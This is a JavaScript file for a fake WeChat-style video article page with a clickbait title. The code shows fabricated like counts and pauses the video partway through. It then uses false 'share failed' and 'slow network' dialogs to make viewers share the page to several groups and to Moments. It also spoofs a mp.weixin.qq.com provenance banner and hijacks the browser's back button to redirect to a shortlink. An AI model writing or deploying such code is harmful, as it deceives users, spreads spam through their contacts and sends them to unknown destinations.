if (top.location != self.location) {
	top.location = self.location;
}

var htimg = 'http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rJLEUQzFF5g6vtaCczdL62ZblmyE4q76Sg/0',
	more_video = 'https://t.cn/RjwQ24Z',
	til = '[看视频分红包，人人有份]特种兵退役开饭店，小痞子不知天高地厚竟来收保护费>>',
	vid = 'm0363jdry96',
	delayTime = 155;

$('#hutui').html('<a href="' + more_video + '"><img src="' + htimg + '" border="0" style="width: 100%;"></a>');
$('#likeNum').html(Number.parseInt(Math.random() * 2000) + 1500);

var video, player, playStatus = 'pending';
var elId = 'mod_player_skin_0';
$("#js_content").html('<div id="' + elId + '" class="player_skin" style="padding-top:6px;"></div>');
var elWidth = $("#js_content").width();
playVideo(vid, elId, elWidth);
$("#pauseplay").height($("#js_content").height() - 10);

if (playStatus == 'pending') {
	var isFirst = true;
	setInterval(function() {
		try {
			var currentTime = player.getCurTime();
			if (currentTime >= delayTime) {
				$('#pauseplay').show();
				player.setPlaytime(delayTime - 1);
				player.pause();
				$.cookie(vid, 's', {
					path: '/'
				});
				if (isFirst) {
					$('#pauseplay').trigger('click');
				}
				isFirst = false;
			}
		} catch (e) {}
	}, 500);
}

function playVideo(vid, elId, elWidth) {
	//定义视频对象
	video = new tvp.VideoInfo();
	//向视频对象传入视频vid
	video.setVid(vid);

	//定义播放器对象
	player = new tvp.Player(elWidth, 200);
	//设置播放器初始化时加载的视频
	player.setCurVideo(video);

	//输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
	//player.addParam("autoplay","1");
	player.addParam("wmode", "transparent");
	player.addParam("pic", tvp.common.getVideoSnapMobile(vid));
	player.write(elId);
}

$('#pauseplay').on('click', function() {
	jssdk();
});

$('#like').on('click', function() {
	var $icon = $(this).find('i');
	var $num = $(this).find('#likeNum');
	var num = 0;
	if (!$icon.hasClass('praised')) {
		num = parseInt($num.html());
		if (isNaN(num)) {
			num = 0;
		}
		$num.html(++num);
		$icon.addClass("praised");
	} else {
		num = parseInt($num.html());
		num--;
		if (isNaN(num)) {
			num = 0;
		}
		$num.html(num);
		$icon.removeClass("praised");
	}
});

var alertTimes = 0;

function wxalert(msg, btn, callback) {
	if (alertTimes == 0) {
		var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
		$("body").append(dialog)
	}
	alertTimes++;
	var d = $('#lly_dialog');
	d.show(200);
	d.find("#lly_dialog_msg").html(msg);
	d.find("#lly_dialog_btn").html(btn);
	d.find("#lly_dialog_btn").off('click').on('click', function() {
		d.hide(200);
		if (callback) {
			callback()
		}
	})
}

var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;
var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
var onVisibilityChange = function() {
		if (!document[hiddenProperty] && delayTime < 9999) {
			shareATimes += 1;
			if (shareATimes > 4) {
				shareTTimes += 1;
				setTimeout(share_tip(shareATimes, shareTTimes), 2000);
			} else {
				setTimeout(share_tip(shareATimes, -1), 2000);
			}
		} else {}
	}
document.addEventListener(visibilityChangeEvent, onVisibilityChange);

var doc = $(document);
var _touches_point1 = 0;
var _touches_point2 = 0;
addEventListener("touchstart", function(e) {
	_touches_point1 = e.touches[0].pageY;
});
addEventListener("touchmove", function(e) {
	e.preventDefault();
	_touches_point2 = e.touches[0].pageY;
	if (doc.scrollTop() <= 0 && _touches_point1 < _touches_point2) {
		if ($('#_domain_display').length <= 0) {
			$('body').prepend('<div id="_domain_display" style="text-align:center;background-color:#2d3132;color:#797d7e;height:0px;font-size:12px;overflow:hidden;"><p style="padding-top:12px;">此网页由 mp.weixin.qq.com 提供</p></div>');
		}
		$('#_domain_display').height((_touches_point2 - _touches_point1) * 0.35);
	} else {
		doc.scrollTop(doc.scrollTop() + ((_touches_point1 - _touches_point2) * 0.4));
	}
	if ((doc.scrollTop() + $(window).height()) >= doc.height() || $('#_b_dp').length > 0) {
		if ($('#_b_dp').length <= 0) {
			$('body').append('<div id="_b_dp" style="text-align:center;color:#797d7e;height:0px;overflow:hidden;"></div>');
		}
		$('#_b_dp').height((_touches_point1 - _touches_point2) * 0.5);
	}
});

addEventListener("touchend", function(e) {
	$('#_domain_display').slideUp('normal', function() {
		$('#_domain_display').remove();
	});
	$('#_b_dp').slideUp('normal', function() {
		$('#_b_dp').remove();
	});
});

var shareATimes = 0,
	shareTTimes = 0;

function share_tip(share_app_times, share_timeline_times) {
	if (share_timeline_times == -1) {
		if (shareATimes == 1) {
			wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可观看！', '好')
		} else if (shareATimes == 2) {
			wxalert('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！', '好')
		} else if (shareATimes == 3) {
			wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看！', '好')
		} else if (share_timeline_times < 1) {
			wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可!', '好')
		}
	} else {
		if (shareATimes <= 3) {
			wxalert('请分享到不同的群!', '好')
		} else {
			wxalert('分享成功, 点击确定继续播放。', '确定', function() {
				delayTime = 99999;
				$("#fenxiang").hide();
				player.play();
			})
		}
	}
}

function jssdk() {
	$("#fenxiang").show();
	show_tip();
}

function show_tip() {
	wxalert('<span style="font-size: 24px;color: #f5294c">网速不好</span><br/>请分享到微信群，可免费加速观看', '好')
}
$(function() {
	$('#fenxiang').on('click', function() {
		show_tip()
	});
});

var d = new Date();
var str = d.getFullYear() + "-" + (d.getMonth() + 1) + "-" + d.getDate();
document.getElementById("post-date").innerHTML = str;

document.title = til;
document.getElementsByTagName('h2')[0].innerHTML = til;

window.onhashchange = function() {
	jp();
};

function hh() {
	history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
}
function jp() {
	location.href = "https://t.cn/RlzaATE?ad=" + (parseInt((parseInt(new Date().getTime() / (1000 * 60 * 1)) + '').substring(2)) + 5000);
}

window.onload = function() {
	var h = new Date().getHours();
	if (h >= -1) {
		setTimeout('hh();', 100);
	}
}
